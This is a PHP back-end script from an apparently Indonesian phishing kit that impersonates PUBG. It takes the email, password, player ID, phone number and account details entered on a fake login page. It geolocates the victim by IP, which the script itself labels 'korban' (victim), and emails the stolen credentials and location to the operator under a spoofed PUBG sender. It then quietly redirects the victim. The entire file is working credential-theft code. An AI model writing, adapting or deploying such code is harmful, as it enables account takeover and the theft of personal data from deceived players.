<?php
//MENGAMBIL SISTEM SCRIPT
include 'system/setting.php';
include 'email.php';

//MENERIMA DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$playid = $_POST['playid'];
$nick = $_POST['nick'];
$phone = $_POST['phone'];
$level = $_POST['level'];
$tier = $_POST['tier'];
$rpt = $_POST['rpt'];
$rpl = $_POST['rpl'];
$platform = $_POST['platform'];
$login = $_POST['login'];

//MENDAPATKAN DATA YANG SUDAH DIDAPATKAN
$arpantek_gans = new curlni();
$arpantek_geooo = $arpantek_gans->geo($ipp);
$arpantek_iplook = $arpantek_gans->iplook($ipp);
$arpantek_bendera = $arpantek_gans->bendera($ipp);

//MENGAMBIL DATA KODE PANGGILAN NEGARA
$arpantek_callcode = $arpantek_geooo['country_code'];

//MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $playid == "" && $nick == "" && $phone == "" && $level == "" && $tier == "" && $rpt == "" && $rpl == "" && $platform == "" && $login == ""){
header("Location: index.php");
}else{

//KONTEN UNTUK KIRIM KE EMAIL
$subjek = "DS $arpantek_bendera +$arpantek_callcode | LEVEL $level | PUNYA SI $nick | LOGIN $login";
$pesan = <<<EOD
<center> 
<div style="background: url(https://i.ibb.co/30cbv4k/banner.png) no-repeat center center; background-size: 100% 100%; width: 294; height: 80px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Akun</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
<th style="width: 78%; text-align: center;"><b>$email</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD</th>
<th style="width: 78%; text-align: center;"><b>$password</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CHARACTER ID</th>
<th style="width: 78%; text-align: center;"><b>$playid</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CHARACTER NAME</th>
<th style="width: 78%; text-align: center;"><b>$nick</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PHONE NUMBER</th>
<th style="width: 78%; text-align: center;"><b>$phone</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ACCOUNT LEVEL</th>
<th style="width:78%;text-align:center;"><b>$level</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>TIER LEVEL</th>
<th style="width: 78%; text-align: center;"><b>$tier</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>RP TYPE</th>
<th style="width:78%;text-align: center;"><b>$rpt</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>RP LEVEL</th>
<th style="width: 78%; text-align: center;"><b>$rpl</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PLATFORM</th>
<th style="width: 78%; text-align: center;"><b>$platform</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LOGIN</th>
<th style="width: 78%; text-align: center;"><b>$login</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Lokasi Korban</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>BENUA</th>
<th style="width: 78%; text-align: center;"><b>$arpantek_iplook[continent]</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>COUNTRY</th>
<th style="width: 78%; text-align: center;"><b>$arpantek_iplook[country]</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CALLING CODE</th>
<th style="width: 78%; text-align: center;"><b>+$arpantek_geooo[country_code]</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>REGION</th>
<th style="width: 78%; text-align: center;"><b>$arpantek_iplook[region]</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CITY</th>
<th style="width: 78%; text-align: center;"><b>$arpantek_iplook[city]</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LATITUDE</th>
<th style="width: 78%; text-align: center;"><b>$arpantek_iplook[lat]</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LONGITUDE</th>
<th style="width: 78%; text-align: center;"><b>$arpantek_iplook[lon]</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ALAMAT IP</th>
<th style="width: 78%; text-align: center;"><b>$arpantek_iplook[query]</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>WAKTU MASUK</th>
<th style="width: 78%; text-align: center;"><b>$jamasuk</th> 
</tr>
</table>
<div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<div style="float: left; margin-top: 3%;">
Temukan saya:
</div>
<div style="float: right;">
<a href="https://facebook.com/dans.storeku/"><img style="margin: 5px;" width="30" src="https://i.ibb.co/SxcV8wB/facebook.png"></a>
<a href="https://t.me/dans_s"><img style="margin: 5px;" width="30" src="https://i.ibb.co/Ph7nCjg/telegram.png"></a>
</div>
</div>
</center>
EOD;
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From: PUBG by NiodTech <muhammadsairi519@gmail.com>' . "\r\n";
$kirim = mail($emailku, $subjek, $pesan, $headers);

//MENERIMA DATA YANG BERHASIL DI-INPUT DAN MENGALIHKAN KE HALAMAN BERHASIL
if($kirim) {
echo "<form id='arpantek' method='POST' action='processing.php'>
<input type='hidden' name='playid' value='$playid'>
<input type='hidden' name='nick' value='$nick'>
</form>
<script type='text/javascript'>document.getElementById('arpantek').submit();</script>";
}
}
?>
